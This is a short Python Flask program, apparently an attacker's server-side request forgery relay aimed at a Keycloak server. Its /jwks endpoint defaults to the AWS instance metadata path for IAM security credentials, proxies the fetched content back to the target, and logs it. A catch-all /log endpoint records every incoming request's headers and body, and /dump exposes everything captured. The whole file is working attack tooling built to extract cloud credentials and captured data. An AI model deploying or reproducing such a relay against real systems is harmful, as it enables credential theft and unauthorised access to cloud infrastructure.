from flask import Flask, redirect, request, jsonify
import logging, time, json, os
import requests  # 新增

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("ssrf-relay")

# 记录所有收到的请求（完整 header + body）
received = []

@app.route("/", methods=["GET","POST","PUT"])
def index():
    return "alive"

# ===== 修改：从 302 重定向改为代理模式 =====
@app.route("/jwks", methods=["GET"])
def jwks_proxy():
    target = request.args.get("t", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    log.info(f"=== JWKS PROXY HIT from {request.remote_addr} ===")
    log.info(f"Target: {target}")
    log.info(f"Headers: {dict(request.headers)}")
    
    # 记录请求
    entry = {
        "time": time.time(),
        "path": "/jwks",
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "target": target
    }
    received.append(entry)
    
    # 代理请求：服务端直接请求 169.254.169.254
    try:
        proxy_resp = requests.get(target, timeout=10, headers={"Accept": "*/*"})
        log.info(f"Proxy response status: {proxy_resp.status_code}")
        log.info(f"Proxy response body: {proxy_resp.text[:500]}")
        
        # 把代理结果记录到 dump
        entry["proxy_response"] = {
            "status": proxy_resp.status_code,
            "body": proxy_resp.text[:5000],
            "headers": dict(proxy_resp.headers)
        }
        
        # 返回给 Keycloak
        return proxy_resp.text, proxy_resp.status_code, {
            "Content-Type": proxy_resp.headers.get("Content-Type", "text/plain")
        }
    except Exception as e:
        log.error(f"Proxy failed: {e}")
        entry["proxy_error"] = str(e)
        return jsonify({"error": str(e)}), 500

# 通用日志端点：记录任何请求的完整内容
@app.route("/log", methods=["GET","POST","PUT"])
@app.route("/log/<path:p>", methods=["GET","POST","PUT"])
def log_all(p=""):
    body = request.get_data(as_text=True)
    entry = {
        "time": time.time(),
        "path": f"/log/{p}",
        "method": request.method,
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "body": body[:5000] if body else None
    }
    received.append(entry)
    log.info(f"=== LOG HIT ===\n{json.dumps(entry, indent=2)}")
    return "ok"

# 查看所有收到的请求
@app.route("/dump")
def dump():
    return jsonify(received)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
